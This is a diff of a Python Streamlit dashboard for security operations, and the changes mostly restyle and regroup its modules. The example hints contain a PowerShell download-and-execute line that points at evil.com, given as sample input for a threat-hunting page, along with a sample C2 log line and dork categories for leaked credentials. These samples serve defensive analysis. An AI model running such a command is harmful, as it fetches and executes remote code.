@@ -26,7 +26,7 @@ try:
     from digital_forensics import DigitalForensicsAnalyzer
 except ImportError:
     class DigitalForensicsAnalyzer:
-        def parse_text_artifacts(self, t): 
+        def parse_text_artifacts(self, t):
             return {
                 "status": "Success",
                 "artifacts": {
@@ -69,7 +69,7 @@ except ImportError:
         from threat_hunter import ThreatHunter
     except ImportError:
         class ThreatHunter:
-            def hunt_powershell_obfuscation(self, s): 
+            def hunt_powershell_obfuscation(self, s):
                 return {
                     "severity": "HIGH",
                     "risk_score": 85,
@@ -98,7 +98,7 @@ try:
     from analyzer import ThreatAnalyzer
 except ImportError:
     class ThreatAnalyzer:
-        def analyze_web_payload(self, p): 
+        def analyze_web_payload(self, p):
             return {
                 "overall_threat": "MALICIOUS ATTACK SIGNATURES DETECTED",
                 "risk_score": 92,
@@ -110,12 +110,42 @@ except ImportError:
             }
 
 
+# ==========================================
+# NAVIGATION STRUCTURE (grouped by function)
+# ==========================================
+NAV_GROUPS = {
+    "Overview": [
+        ("🏠", "Overview & Dashboard"),
+    ],
+    "Threat Intelligence": [
+        ("🌐", "Global Threat Intel (VirusTotal)"),
+        ("🛰️", "AlienVault OTX Live Threat Feed"),
+        ("🎯", "Threat Hunting & IOCs"),
+    ],
+    "Detection & Forensics": [
+        ("🛡️", "SIEM & Log Anomaly Detector"),
+        ("🔎", "Digital Forensics & Logs"),
+        ("🔬", "Web Application Threat Analyzer"),
+    ],
+    "Offensive Security": [
+        ("🔍", "Deep Bug Bounty & Vulnerability Scanner"),
+        ("🌐 ", "OSINT & WordPress Dork Recon"),
+        ("🔐", "Crypto & Password Analyzer"),
+        ("📊", "Vulnerability Management"),
+    ],
+    "Response": [
+        ("⚡", "Incident Response & SOAR"),
+        ("📝", "Live Incident Defense & Reporting"),
+    ],
+}
+
+
 class SOCDashboardUI:
 
     def __init__(self):
         self.app_name = "MHZALY Enterprise SOC & Threat Defense Platform"
-        self.version = "33.0 Fully Detailed & Polished Elite Suite"
-        
+        self.version = "34.0 Refined Enterprise Edition"
+
         # Initialize Engines safely
         self.processor = ThreatIntelProcessor()
         self.otx_processor = OTXThreatIntel()
@@ -126,168 +156,271 @@ class SOCDashboardUI:
         self.vuln_mgr = VulnerabilityManager()
         self.analyzer = ThreatAnalyzer()
 
+    # ------------------------------------------------------------
+    # THEME / LAYOUT
+    # ------------------------------------------------------------
     def setup_page_config(self):
         st.set_page_config(page_title=self.app_name, layout="wide", page_icon="🛡️")
-        
-        # ==========================================
-        # WORLD-CLASS CYBERPUNK SOC & GLASSMORPHISM CSS
-        # ==========================================
+
         st.markdown("""
         <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
 
-        .stApp, [data-testid="stAppViewContainer"] {
-            background: radial-gradient(circle at 10% 20%, #030712 0%, #080e1a 50%, #02040a 100%) !important;
-            color: #f1f5f9 !important;
-            font-family: 'Plus Jakarta Sans', sans-serif !important;
+        html, body, [data-testid="stAppViewContainer"], .stApp {
+            font-family: 'Inter', sans-serif !important;
         }
 
+        .stApp {
+            background: #0d1017 !important;
+            color: #e5e7eb !important;
+        }
+
+        /* Sidebar */
         [data-testid="stSidebar"] {
-            background: linear-gradient(180deg, #070b14 0%, #04070d 100%) !important;
-            border-right: 1px solid rgba(0, 242, 254, 0.15) !important;
-            box-shadow: 6px 0 30px rgba(0, 0, 0, 0.6);
+            background: #0a0c12 !important;
+            border-right: 1px solid #1e2330 !important;
         }
-        [data-testid="stSidebar"] div, [data-testid="stSidebar"] p, [data-testid="stSidebar"] label, [data-testid="stSidebar"] span {
-            color: #94a3b8 !important;
-            font-family: 'Plus Jakarta Sans', sans-serif !important;
+        [data-testid="stSidebar"] p, [data-testid="stSidebar"] span, [data-testid="stSidebar"] label {
+            color: #9ca3af !important;
+            font-family: 'Inter', sans-serif !important;
         }
-        
+        [data-testid="stSidebar"] .stRadio label {
+            padding: 4px 0;
+        }
+
+        /* Inputs */
         .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div {
-            background-color: #0b1326 !important;
-            color: #38bdf8 !important;
-            border: 1px solid rgba(56, 189, 248, 0.3) !important;
-            border-radius: 10px !important;
+            background-color: #151925 !important;
+            color: #e5e7eb !important;
+            border: 1px solid #2a3040 !important;
+            border-radius: 8px !important;
             font-family: 'JetBrains Mono', monospace !important;
         }
         .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
-            border-color: #00f2fe !important;
-            box-shadow: 0 0 15px rgba(0, 242, 254, 0.35) !important;
+            border-color: #2dd4bf !important;
+            box-shadow: 0 0 0 1px rgba(45, 212, 191, 0.4) !important;
         }
-        
+
+        /* Buttons */
         .stButton>button {
-            background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%) !important;
+            background: #1f6feb !important;
             color: #ffffff !important;
             border: none !important;
-            border-radius: 10px !important;
-            font-family: 'Plus Jakarta Sans', sans-serif !important;
-            font-weight: 700 !important;
+            border-radius: 8px !important;
+            font-weight: 600 !important;
             font-size: 14px !important;
-            padding: 10px 24px !important;
-            box-shadow: 0 4px 20px rgba(67, 100, 247, 0.4) !important;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
+            padding: 8px 20px !important;
+            transition: background 0.15s ease-in-out !important;
         }
         .stButton>button:hover {
-            transform: translateY(-2px) scale(1.02) !important;
-            box-shadow: 0 6px 25px rgba(0, 242, 254, 0.6) !important;
+            background: #388bfd !important;
         }
-        
-        h1 {
-            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%) !important;
-            -webkit-background-clip: text !important;
-            -webkit-text-fill-color: transparent !important;
-            font-weight: 800 !important;
+        .stDownloadButton>button {
+            background: #151925 !important;
+            color: #2dd4bf !important;
+            border: 1px solid #2dd4bf !important;
+            border-radius: 8px !important;
+            font-weight: 600 !important;
         }
-        h2, h3, h4 {
-            color: #38bdf8 !important;
-            font-weight: 700 !important;
+
+        /* Headings */
+        h1 { color: #f9fafb !important; font-weight: 800 !important; }
+        h2, h3, h4 { color: #d1d5db !important; font-weight: 700 !important; }
+
+        /* Metric cards */
+        [data-testid="stMetric"] {
+            background: #131722 !important;
+            border: 1px solid #1e2330 !important;
+            border-radius: 12px !important;
+            padding: 14px 16px !important;
         }
-        
         [data-testid="stMetricValue"] {
-            color: #00f2fe !important;
+            color: #2dd4bf !important;
             font-family: 'JetBrains Mono', monospace !important;
             font-weight: 700 !important;
         }
         [data-testid="stMetricLabel"] {
-            color: #cbd5e1 !important;
+            color: #9ca3af !important;
             font-weight: 600 !important;
         }
-        
+
         code, pre {
-            background-color: #050811 !important;
-            color: #00f2fe !important;
-            border: 1px solid rgba(0, 242, 254, 0.25) !important;
-            border-radius: 8px !important;
-            font-family: 'JetBrains Mono', monospace !important;
+            background-color: #10131c !important;
+            color: #2dd4bf !important;
+            border: 1px solid #232838 !important;
+            border-radius: 6px !important;
         }
 
         .stAlert {
-            background: rgba(11, 19, 38, 0.9) !important;
-            border: 1px solid rgba(56, 189, 248, 0.3) !important;
-            border-radius: 12px !important;
-            backdrop-filter: blur(12px) !important;
+            background: #131722 !important;
+            border: 1px solid #232838 !important;
+            border-radius: 10px !important;
+        }
+
+        .mhz-page-header {
+            border-bottom: 1px solid #1e2330;
+            padding-bottom: 14px;
+            margin-bottom: 18px;
+        }
+        .mhz-page-header h1 {
+            margin-bottom: 2px !important;
+            font-size: 26px !important;
+        }
+        .mhz-page-header p {
+            color: #9ca3af !important;
+            margin: 0 !important;
+            font-size: 14px !important;
+        }
+
+        .mhz-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+            border: 1px solid #2dd4bf;
+            color: #2dd4bf;
+            background: rgba(45, 212, 191, 0.08);
         }
         </style>
         """, unsafe_allow_html=True)
 
+    def _page_header(self, icon, title, subtitle):
+        """Consistent, compact header used across every module page."""
+        st.markdown(
+            f"""
+            <div class="mhz-page-header">
+                <h1>{icon} {title}</h1>
+                <p>{subtitle}</p>
+            </div>
+            """,
+            unsafe_allow_html=True
+        )
+
+    def _example_hint(self, markdown_text):
+        with st.expander("💡 Show usage example", expanded=False):
+            st.markdown(markdown_text)
+
+    # ------------------------------------------------------------
+    # SIDEBAR
+    # ------------------------------------------------------------
     def render_sidebar(self):
         st.sidebar.markdown(
             """
-            <div style='text-align: center; padding: 10px 0;'>
-                <h2 style='margin:0; background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;'>🛡️ MHZALY SOC</h2>
-                <span style='display:inline-block; margin-top:4px; padding:2px 10px; font-size:10px; font-weight:700; background:rgba(0,242,254,0.12); border:1px solid #00f2fe; color:#00f2fe; border-radius:12px;'>FULLY DETAILED SUITE</span>
+            <div style='text-align:center; padding: 6px 0 2px 0;'>
+                <h2 style='margin:0; color:#f9fafb; font-size:19px;'>🛡️ MHZALY SOC</h2>
+                <span class='mhz-badge'>ENTERPRISE SUITE</span>
             </div>
-            """, 
+            """,
             unsafe_allow_html=True
         )
-        st.sidebar.markdown(f"<p style='text-align:center; color:#64748b !important; font-size:11px; margin-top:5px;'>Version: {self.version}</p>", unsafe_allow_html=True)
+        st.sidebar.markdown(
+            f"<p style='text-align:center; color:#6b7280 !important; font-size:11px; margin-top:6px;'>v{self.version}</p>",
+            unsafe_allow_html=True
+        )
         st.sidebar.markdown("---")
-        return st.sidebar.radio("Navigation Menu", [
-            "Overview & Dashboard",
-            "Global Threat Intel (VirusTotal)", 
-            "AlienVault OTX Live Threat Feed", 
-            "SIEM & Log Anomaly Detector",         
-            "Deep Bug Bounty & Vulnerability Scanner", 
-            "OSINT & WordPress Dork Recon",  
-            "Crypto & Password Analyzer",  
-            "Threat Hunting & IOCs",
-            "Digital Forensics & Logs",
-            "Incident Response & SOAR",
-            "Vulnerability Management",
-            "Web Application Threat Analyzer",
-            "Live Incident Defense & Reporting"
-        ])
 
+        flat_labels = []
+        for group_name, items in NAV_GROUPS.items():
+            st.sidebar.markdown(f"<p style='font-size:11px; letter-spacing:0.06em; color:#4b5563 !important; font-weight:700; margin:10px 0 2px 4px;'>{group_name.upper()}</p>", unsafe_allow_html=True)
+            for icon, label in items:
+                flat_labels.append(f"{icon}  {label}")
+
+        selection = st.sidebar.radio("Navigation Menu", flat_labels, label_visibility="collapsed")
+        clean_choice = selection.split("  ", 1)[1] if "  " in selection else selection
+
+        st.sidebar.markdown("---")
+        st.sidebar.markdown(
+            """
+            <div style='font-size:11px; color:#6b7280; line-height:1.6;'>
+                🟢 <b>System:</b> Operational<br>
+                📡 <b>Pipeline:</b> Active<br>
+                🔒 <b>Modules:</b> 12 Online
+            </div>
+            """,
+            unsafe_allow_html=True
+        )
+        return clean_choice
+
+    # ------------------------------------------------------------
+    # OVERVIEW
+    # ------------------------------------------------------------
     def run_overview(self):
-        st.title("🛡️ MHZALY Enterprise SOC Command Center")
-        st.markdown("Detailed telemetry, defensive security postures, and SIEM automated orchestration.")
-        st.markdown("---")
-        st.info("🟢 SYSTEM OPERATIONAL | SIEM PIPELINE ACTIVE | ALL 12 MODULES ONLINE")
-        
+        self._page_header("🛡️", "SOC Command Center", "Live telemetry, defensive posture, and incident activity across all 12 modules.")
+
+        st.markdown(
+            "<span class='mhz-badge'>SYSTEM OPERATIONAL</span> "
+            "<span class='mhz-badge'>SIEM PIPELINE ACTIVE</span> "
+            "<span class='mhz-badge'>ALL MODULES ONLINE</span>",
+            unsafe_allow_html=True
+        )
+        st.write("")
+
+        file_name = "incident_reports.csv"
+        log_df = pd.read_csv(file_name) if os.path.exists(file_name) else pd.DataFrame()
+
         col1, col2, col3, col4 = st.columns(4)
         with col1:
-            st.metric("Active Defense Engines", "12 Modules", "Operational")
+            st.metric("Active Defense Engines", "12", "Operational")
         with col2:
-            st.metric("SOC Posture", "Protected", "Secure")
+            st.metric("Logged Incidents", len(log_df) if not log_df.empty else 0)
         with col3:
-            st.metric("Platform Version", self.version, "Stable")
+            open_count = int((log_df["Status"].str.contains("Active|Escalated", case=False, na=False)).sum()) if "Status" in log_df.columns else 0
+            st.metric("Open / Active Cases", open_count)
         with col4:
             st.metric("Lead SOC Engineer", "M. Hassaan Zahid", "Access: ROOT")
 
         st.markdown("---")
-        st.markdown("### 📡 Live Incident Event Log (SIEM Database)")
-        
-        file_name = "incident_reports.csv"
-        if os.path.exists(file_name):
-            try:
-                real_log_data = pd.read_csv(file_name)
-                if "Timestamp" in real_log_data.columns:
-                    real_log_data = real_log_data.sort_values(by="Timestamp", ascending=False)
-                st.dataframe(real_log_data, use_container_width=True, hide_index=True)
-            except Exception as e:
-                st.error("Error reading live database records.")
-        else:
-            st.warning("⚠️ No active security incidents logged yet. Use 'Incident Response & SOAR' or 'Live Incident Defense' to record threats.")
 
+        left, right = st.columns([2, 1])
+
+        with left:
+            st.markdown("### 📡 Live Incident Event Log")
+            if not log_df.empty:
+                if "Timestamp" in log_df.columns:
+                    log_df = log_df.sort_values(by="Timestamp", ascending=False)
+
+                search = st.text_input("Search incidents (asset, notes, status)...", placeholder="e.g. ransomware, SRV-DB-02, Escalated")
+                filtered_df = log_df
+                if search:
+                    mask = log_df.apply(lambda row: row.astype(str).str.contains(search, case=False, na=False).any(), axis=1)
+                    filtered_df = log_df[mask]
+
+                st.dataframe(filtered_df, use_container_width=True, hide_index=True)
+
+                st.download_button(
+                    "⬇ Export Incident Log (CSV)",
+                    data=log_df.to_csv(index=False).encode("utf-8"),
+                    file_name=f"incident_export_{datetime.now().strftime('%Y%m%d_%H%M')}.csv",
+                    mime="text/csv"
+                )
+            else:
+                st.warning("⚠️ No active security incidents logged yet. Use 'Incident Response & SOAR' or 'Live Incident Defense' to record threats.")
+
+        with right:
+            st.markdown("### 📊 Case Status Breakdown")
+            if not log_df.empty and "Status" in log_df.columns:
+                status_counts = log_df["Status"].value_counts()
+                st.bar_chart(status_counts)
+            else:
+                st.info("Status chart will appear once incidents are logged.")
+
+            st.markdown("### 🚀 Quick Actions")
+            st.caption("Jump straight into a scanner from here:")
+            st.markdown(
+                "- 🌐 Global Threat Intel\n"
+                "- 🛡️ SIEM Log Analyzer\n"
+                "- ⚡ Incident Response & SOAR\n"
+                "\n*(select from the sidebar)*"
+            )
+
+    # ------------------------------------------------------------
+    # THREAT INTEL (VirusTotal)
+    # ------------------------------------------------------------
     def run_threat_intel(self):
-        st.title("🌐 Global Threat Intelligence (VirusTotal API)")
-        st.markdown("Query global threat reputations, malicious file hashes, and security engine verdicts.")
-        
-        st.markdown(
-            "> **💡 Testing Examples (Copy & Paste below):**\n"
-            "> * **IP Address:** `8.8.8.8` or `1.1.1.1`\n"
-            "> * **Domain:** `google.com`"
-        )
-        
+        self._page_header("🌐", "Global Threat Intelligence", "Query global threat reputations, malicious file hashes, and security engine verdicts (VirusTotal API).")
+        self._example_hint("**IP Address:** `8.8.8.8` or `1.1.1.1`  \n**Domain:** `google.com`")
+
         target = st.text_input("Enter Target IP Address or Domain:", placeholder="e.g., 8.8.8.8")
         if st.button("Initiate Threat Scan"):
             if target:
@@ -298,12 +431,12 @@ class SOCDashboardUI:
                     else:
                         st.success("Target Analysis Complete!")
                         stats = result.get('last_analysis_stats', {})
-                        
+
                         c1, c2, c3 = st.columns(3)
                         c1.metric("🚨 Malicious Verdicts", stats.get('malicious', 0))
                         c2.metric("⚠️ Suspicious Verdicts", stats.get('suspicious', 0))
                         c3.metric("✅ Harmless / Clean", stats.get('harmless', 0))
-                        
+
                         st.markdown("---")
                         st.markdown("### 🔬 Security Vendor Engine Results")
                         analysis_results = result.get('last_analysis_results', {})
@@ -315,34 +448,31 @@ class SOCDashboardUI:
                                     "Category": details.get('category'),
                                     "Result": details.get('result')
                                 })
-                            
+
                             df_vendors = pd.DataFrame(vendor_data)
                             filter_choice = st.selectbox("Filter Vendor Findings", ["All Engines", "Malicious / Suspicious Only", "Harmless Only"])
                             if filter_choice == "Malicious / Suspicious Only":
                                 df_vendors = df_vendors[df_vendors['Category'].isin(['malicious', 'suspicious'])]
                             elif filter_choice == "Harmless Only":
                                 df_vendors = df_vendors[df_vendors['Category'] == 'harmless']
-                                
+
                             st.dataframe(df_vendors, use_container_width=True, hide_index=True)
             else:
                 st.warning("Please specify a domain or IP indicator to scan.")
 
+    # ------------------------------------------------------------
+    # OTX THREAT FEED
+    # ------------------------------------------------------------
     def run_otx_threat_feed(self):
-        st.title("🛰️ AlienVault OTX Threat Intelligence Feed")
-        st.markdown("Query global open-source threat telemetry, adversary campaigns, and active threat pulses.")
-        
-        st.markdown(
-            "> **💡 Testing Examples (Copy & Paste below):**\n"
-            "> * **IP Indicator:** `198.51.100.25`\n"
-            "> * **Domain Indicator:** `malicious-host.net`"
-        )
-        
+        self._page_header("🛰️", "AlienVault OTX Threat Intelligence", "Query global open-source threat telemetry, adversary campaigns, and active threat pulses.")
+        self._example_hint("**IP Indicator:** `198.51.100.25`  \n**Domain Indicator:** `malicious-host.net`")
+
         col1, col2 = st.columns([1, 2])
         with col1:
             indicator_type = st.selectbox("Select Indicator Type", ["IP", "Domain"])
         with col2:
             query_target = st.text_input("Enter Indicator:", placeholder="e.g., 198.51.100.25")
-            
+
         if st.button("Query OTX Telemetry"):
             if query_target:
                 with st.spinner("Fetching global community threat pulses from OTX..."):
@@ -352,12 +482,12 @@ class SOCDashboardUI:
                     else:
                         st.success("OTX Intelligence Telemetry Retrieved Successfully!")
                         pulse_count = res.get("threat_pulse_count", 0)
-                        
+
                         c1, c2, c3 = st.columns(3)
                         c1.metric("Active Threat Pulses", pulse_count)
                         c2.metric("Hosting Country", res.get("country", "N/A"))
                         c3.metric("Network ASN", res.get("asn", "N/A"))
-                        
+
                         st.markdown("---")
                         if pulse_count > 0:
                             st.error(f"🚨 Active Threat: This indicator is linked to {pulse_count} active security campaigns worldwide!")
@@ -370,21 +500,21 @@ class SOCDashboardUI:
             else:
                 st.warning("Please provide a valid indicator.")
 
+    # ------------------------------------------------------------
+    # SIEM LOG ANALYZER
+    # ------------------------------------------------------------
     def run_blue_team_log_analyzer(self):
-        st.title("🛡️ SIEM & Log Anomaly Detector")
-        st.markdown("Automate raw server, firewall, or authentication log parsing and brute-force detection.")
-        
-        st.markdown(
-            "> **💡 Testing Example (Copy & Paste into box below):**\n"
-            "> ```text\n"
-            "> Failed password for root from 192.168.1.50 port 22 ssh2\n"
-            "> Failed password for invalid user admin from 10.0.0.15 port 443\n"
-            "> Accepted password for hassaan from 192.168.1.10 port 22 ssh2\n"
-            "> ```"
+        self._page_header("🛡️", "SIEM & Log Anomaly Detector", "Automate raw server, firewall, or authentication log parsing and brute-force detection.")
+        self._example_hint(
+            "```text\n"
+            "Failed password for root from 192.168.1.50 port 22 ssh2\n"
+            "Failed password for invalid user admin from 10.0.0.15 port 443\n"
+            "Accepted password for hassaan from 192.168.1.10 port 22 ssh2\n"
+            "```"
         )
-        
+
         raw_logs = st.text_area("Paste Raw Server / Firewall / Auth Logs Here:", placeholder="Paste log strings here...", height=130)
-        
+
         if st.button("Analyze Logs for Anomalies"):
             if raw_logs:
                 with st.spinner("Executing heuristic anomaly detection rules..."):
@@ -393,12 +523,12 @@ class SOCDashboardUI:
                     failed_logins = 0
                     success_logins = 0
                     anomaly_records = []
-                    
+
                     for line in lines:
                         lower_line = line.lower()
                         ip_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)
                         ip_found = ip_match.group() if ip_match else "Unknown IP"
-                        
+
                         if "fail" in lower_line or "invalid" in lower_line or "error" in lower_line:
                             failed_logins += 1
                             anomaly_records.append({
@@ -415,16 +545,22 @@ class SOCDashboardUI:
                                 "Source IP": ip_found,
                                 "Threat Level": "Low"
                             })
-                            
+
                     st.success("Log Heuristic Analysis Complete!")
                     c1, c2, c3 = st.columns(3)
                     c1.metric("Total Log Entries", total_lines)
                     c2.metric("🚨 Auth Errors & Failures", failed_logins)
                     c3.metric("✅ Authorized Logins", success_logins)
-                    
+
                     st.markdown("---")
                     if anomaly_records:
                         df_logs = pd.DataFrame(anomaly_records)
+
+                        top_ips = df_logs[df_logs["Threat Level"] == "High"]["Source IP"].value_counts().head(5)
+                        if not top_ips.empty:
+                            st.markdown("#### 🚨 Top Offending Source IPs")
+                            st.bar_chart(top_ips)
+
                         log_filter = st.selectbox("Filter Log Events", ["All Events", "Malicious / Failed Only", "Successful Sessions Only"])
                         if log_filter == "Malicious / Failed Only":
                             df_logs = df_logs[df_logs['Threat Level'] == 'High']
@@ -434,15 +570,13 @@ class SOCDashboardUI:
             else:
                 st.warning("Please paste raw log data to analyze.")
 
+    # ------------------------------------------------------------
+    # BUG BOUNTY / HEADER SCANNER
+    # ------------------------------------------------------------
     def run_bug_bounty_scanner(self):
-        st.title("🔍 Infrastructure & Security Header Analyzer")
-        st.markdown("Inspect HTTP response headers, CSP directives, and cookie flags for attack surface mapping.")
-        
-        st.markdown(
-            "> **💡 Testing Example (Copy & Paste below):**\n"
-            "> * `example.com` or `hackerone.com`"
-        )
-        
+        self._page_header("🔍", "Infrastructure & Security Header Analyzer", "Inspect HTTP response headers, CSP directives, and cookie flags for attack surface mapping.")
+        self._example_hint("`example.com` or `hackerone.com`")
+
         domain = st.text_input("Enter Target Domain:", placeholder="e.g., target-asset.com")
         if st.button("Execute Infrastructure Scan"):
             if domain:
@@ -455,21 +589,21 @@ class SOCDashboardUI:
                         c1, c2 = st.columns(2)
                         c1.metric("Target Final URL", scan_res.get('final_url'))
                         c2.metric("HTTP Status Code", scan_res.get('status_code'))
-                        
+
                         st.markdown("---")
                         findings = scan_res.get('findings', [])
                         if findings:
                             df_findings = pd.DataFrame(findings)
                             st.dataframe(df_findings, use_container_width=True, hide_index=True)
+            else:
+                st.warning("Please provide a target domain.")
 
+    # ------------------------------------------------------------
+    # OSINT DORKS
+    # ------------------------------------------------------------
     def run_osint_dorks(self):
-        st.title("🌐 OSINT & WordPress Google Dork Reconnaissance")
-        st.markdown("Automate open-source intelligence footprinting, sensitive file leaks, and WordPress security/payload reconnaissance.")
-
-        st.markdown(
-            "> **💡 Testing Example:**\n"
-            "> * Type any target asset domain like `example.com` or `mytestsite.com` below to generate targeted search dorks."
-        )
+        self._page_header("🌐", "OSINT & WordPress Google Dork Reconnaissance", "Automate open-source intelligence footprinting, sensitive file leaks, and WordPress security reconnaissance.")
+        self._example_hint("Type any target asset domain like `example.com` or `mytestsite.com` below to generate targeted search dorks.")
 
         dork_categories = {
             "01. Sensitive Files & Credentials": [
@@ -513,7 +647,7 @@ class SOCDashboardUI:
             final_query = query_template.replace("target.com", clean_domain)
             encoded_query = urllib.parse.quote(final_query)
             search_url = f"https://www.google.com/search?q={encoded_query}"
-            
+
             recon_records.append({
                 "Vector Objective": name,
                 "Risk Rating": risk,
@@ -528,50 +662,54 @@ class SOCDashboardUI:
         for item in recon_records:
             st.markdown(f"- **{item['Vector Objective']}** (`{item['Risk Rating']}`): [Launch Query on Search Engine ↗]({item['Launch URL']})")
 
+    # ------------------------------------------------------------
+    # CRYPTO / PASSWORD ANALYZER
+    # ------------------------------------------------------------
     def run_crypto_analyzer(self):
-        st.title("🔐 Cryptographic Hash & Password Strength Analyzer")
-        st.markdown("Analyze entropy, compute cryptographic hashes, and validate secret keys.")
-        
-        st.markdown(
-            "> **💡 Testing Example:**\n"
-            "> * Type a strong password like `CyberSec@2026!#` or `admin123` to test strength and MD5/SHA256 hashes."
-        )
-        
+        self._page_header("🔐", "Cryptographic Hash & Password Strength Analyzer", "Analyze entropy, compute cryptographic hashes, and validate secret keys.")
+        self._example_hint("Type a strong password like `CyberSec@2026!#` or `admin123` to test strength and MD5/SHA256 hashes.")
+
         target_input = st.text_input("Enter Data String / Password:", type="password", placeholder="Enter secret or password...")
         if target_input:
             md5_hash = hashlib.md5(target_input.encode()).hexdigest()
             sha256_hash = hashlib.sha256(target_input.encode()).hexdigest()
-            
+
             st.text_input("MD5 Hash", value=md5_hash, disabled=True)
             st.text_input("SHA-256 Hash", value=sha256_hash, disabled=True)
-            
-            length = len(target_input)
-            if length >= 12:
-                st.success("🟢 Strong Password Length (12+ characters)")
-            else:
-                st.warning("⚠️ Weak Password Length: Recommended minimum length is 12 characters.")
 
+            length = len(target_input)
+            has_upper = any(c.isupper() for c in target_input)
+            has_digit = any(c.isdigit() for c in target_input)
+            has_symbol = any(not c.isalnum() for c in target_input)
+            strength_score = sum([length >= 12, has_upper, has_digit, has_symbol])
+
+            st.progress(strength_score / 4)
+            if strength_score == 4:
+                st.success("🟢 Strong Password: Good length, mixed case, digits, and symbols.")
+            elif strength_score >= 2:
+                st.warning("🟡 Moderate Password: Consider adding length, symbols, or mixed case.")
+            else:
+                st.error("🔴 Weak Password: Increase length and complexity.")
+
+    # ------------------------------------------------------------
+    # THREAT HUNTING
+    # ------------------------------------------------------------
     def run_threat_hunting(self):
-        st.title("🎯 Proactive Threat Hunting & IOC Analysis")
-        st.markdown("Analyze obfuscated PowerShell scripts and command line execution telemetry.")
-        
-        st.markdown(
-            "> **💡 Testing Example (Copy & Paste below):**\n"
-            "> * `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`"
-        )
-        
+        self._page_header("🎯", "Proactive Threat Hunting & IOC Analysis", "Analyze obfuscated PowerShell scripts and command line execution telemetry.")
+        self._example_hint("`IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`")
+
         script_input = st.text_area("Input PowerShell / Base64 Payload:", placeholder="Paste base64 encoded or obfuscated command line strings...")
         if st.button("Execute Hunt Protocol"):
             if script_input:
                 with st.spinner("Executing threat hunting heuristics & deobfuscation..."):
                     res = self.hunter.hunt_powershell_obfuscation(script_input)
                     st.success("Threat Hunting Analysis Completed Successfully!")
-                    
+
                     c1, c2, c3 = st.columns(3)
                     c1.metric("Threat Severity", res.get("severity", "HIGH"))
                     c2.metric("Heuristic Risk Score", f"{res.get('risk_score', 0)} / 100")
                     c3.metric("Decoded Payloads", len(res.get("decoded_payloads", [])))
-                    
+
                     st.markdown("---")
                     st.markdown("### 🔬 Detailed Threat Indicators & Findings")
                     findings = res.get("findings", [])
@@ -580,68 +718,71 @@ class SOCDashboardUI:
             else:
                 st.warning("Please provide a payload to hunt.")
 
+    # ------------------------------------------------------------
+    # DIGITAL FORENSICS
+    # ------------------------------------------------------------
     def run_digital_forensics(self):
-        st.title("🔎 Digital Forensics & Log Artifacts")
-        st.markdown("Extract forensic artifacts, timestamps, and indicators of compromise from raw dumps.")
-        
-        st.markdown(
-            "> **💡 Testing Example (Copy & Paste below):**\n"
-            "> * `Connection from 192.168.1.100 connected via http://malicious-c2.net/exec and accessed C:\\Windows\\System32\\cmd.exe with MD5: d41d8cd98f00b204e9800998ecf8427e`"
-        )
-        
+        self._page_header("🔎", "Digital Forensics & Log Artifacts", "Extract forensic artifacts, timestamps, and indicators of compromise from raw dumps.")
+        self._example_hint("`Connection from 192.168.1.100 connected via http://malicious-c2.net/exec and accessed C:\\Windows\\System32\\cmd.exe with MD5: d41d8cd98f00b204e9800998ecf8427e`")
+
         logs_input = st.text_area("Input Raw Logs / Hex Dump:", placeholder="Paste raw event artifacts or logs here...", height=130)
         if st.button("Extract Artifacts"):
             if logs_input:
                 with st.spinner("Parsing raw logs and extracting forensic artifacts..."):
                     res = self.forensics.parse_text_artifacts(logs_input)
                     st.success("Forensic Artifact Extraction Complete!")
-                    
+
                     artifacts = res.get("artifacts", {})
                     c1, c2, c3, c4 = st.columns(4)
                     c1.metric("Extracted IPs", len(artifacts.get("IPv4 Address", [])))
                     c2.metric("Cryptographic Hashes", len(artifacts.get("MD5 Hash", [])) + len(artifacts.get("SHA256 Hash", [])))
                     c3.metric("C2 URLs / Endpoints", len(artifacts.get("C2 / Web URL", [])))
                     c4.metric("File Paths", len(artifacts.get("Windows File Path", [])))
-                    
+
                     st.markdown("---")
                     table_rows = []
                     for cat, vals in artifacts.items():
                         for v in vals:
                             table_rows.append({"Artifact Category": cat, "Extracted Value": v})
                     if table_rows:
-                        st.dataframe(pd.DataFrame(table_rows), use_container_width=True, hide_index=True)
+                        artifacts_df = pd.DataFrame(table_rows)
+                        st.dataframe(artifacts_df, use_container_width=True, hide_index=True)
+                        st.download_button(
+                            "⬇ Export Artifacts (CSV)",
+                            data=artifacts_df.to_csv(index=False).encode("utf-8"),
+                            file_name=f"forensic_artifacts_{datetime.now().strftime('%Y%m%d_%H%M')}.csv",
+                            mime="text/csv"
+                        )
             else:
                 st.warning("Please provide forensic data.")
 
+    # ------------------------------------------------------------
+    # INCIDENT RESPONSE / SOAR
+    # ------------------------------------------------------------
     def run_incident_response(self):
-        st.title("⚡ Automated SOAR Playbooks & Ticketing")
-        st.markdown("Generate incident tickets, assign SLAs, and trigger automated response playbooks.")
-        
-        st.markdown(
-            "> **💡 Testing Example:**\n"
-            "> * **Asset ID:** `SRV-DATABASE-02` | **Severity:** `CRITICAL` | **Description:** `Unauthorized root login detected from external IP.`"
-        )
-        
+        self._page_header("⚡", "Automated SOAR Playbooks & Ticketing", "Generate incident tickets, assign SLAs, and trigger automated response playbooks.")
+        self._example_hint("**Asset ID:** `SRV-DATABASE-02` | **Severity:** `CRITICAL` | **Description:** `Unauthorized root login detected from external IP.`")
+
         target = st.text_input("Compromised Asset / Host ID:", placeholder="e.g., WORKSTATION-04", value="")
         severity = st.selectbox("Threat Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"])
